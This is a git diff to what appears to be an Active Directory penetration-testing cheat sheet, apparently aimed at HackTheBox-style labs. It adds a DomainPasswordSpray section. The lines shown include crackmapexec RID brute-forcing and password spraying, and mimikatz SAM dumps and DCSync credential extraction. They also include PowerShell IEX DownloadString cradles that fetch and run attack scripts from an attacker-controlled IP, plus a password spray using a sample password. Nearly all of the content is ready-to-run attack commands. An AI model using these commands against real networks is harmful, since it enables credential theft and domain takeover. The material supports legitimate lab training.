@@ -43,6 +43,7 @@
     - [PsMapexec](#psmapexec)
     - [kerbrute](#kerbrute)
     - [mimikatz](#mimikatz)
+    - [DomainPasswordSpray](#domainpasswordspray)
     - [AD](#ad)
 - [Lateral Movement](#lateral-movement)
   - [NTLM Relay](#ntlm-relay)
@@ -450,7 +451,7 @@ crackmapexec smb 10.129.144.138 -u "guest" -p "" --rid-brute --pass-pol
 crackmapexec smb 10.129.144.138 -u user_list -p user_list --no-brute
 ```
 ### PsMapexec
-```bash
+```powershell
 wget https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1
 IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.108/PsMapExec.ps1')
 
@@ -485,6 +486,13 @@ whoami /user
 .\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
 .\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt /domain:htb.local" "exit"
 .\mimikatz.exe "privilege::debug" "lsadump::dcsync /all /domain:htb.local" "exit"
+```
+### DomainPasswordSpray
+```powershell
+wget https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.108/DomainPasswordSpray.ps1')
+
+Invoke-DomainPasswordSpray -Password Winter2022 -ErrorAction SilentlyContinue
 ```
 ### AD
 #### AS-REP
